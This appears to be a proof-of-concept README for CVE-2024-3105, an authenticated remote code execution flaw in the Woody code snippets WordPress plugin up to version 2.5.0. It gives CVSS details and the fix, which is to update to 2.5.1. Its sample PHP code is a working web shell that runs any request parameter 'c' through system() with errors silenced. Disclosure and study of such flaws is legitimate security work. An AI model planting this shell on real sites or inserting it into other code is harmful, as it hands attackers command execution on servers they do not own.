# CVE-2024-3105 (PoC)
The Woody code snippets – Insert Header Footer Code, AdSense Ads plugin for WordPress is vulnerable to Remote Code Execution in all versions up to, and including, 2.5.0 via the 'insert_php' shortcode. This is due to the plugin not restricting the usage of the functionality to high level authorized users. This makes it possible for authenticated attackers, with contributor-level access and above, to execute code on the server.

## Info
Base Score: **9.9 CRITICAL** \
Vector: **CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H** \
Software Type: **Plugin** \
Software Slug: **insert-php** \
Remediation: **Update to version 2.5.1, or a newer patched version** \
Affected Version: **<= 2.5.0**

## Sample PHP code
```php
<?php
    error_reporting(0);
    $cmd = "$_REQUEST[c]";
    if ($cmd == "") {
	    $cmd = "echo > NUL";
    }
    @system("$cmd");
?>
```
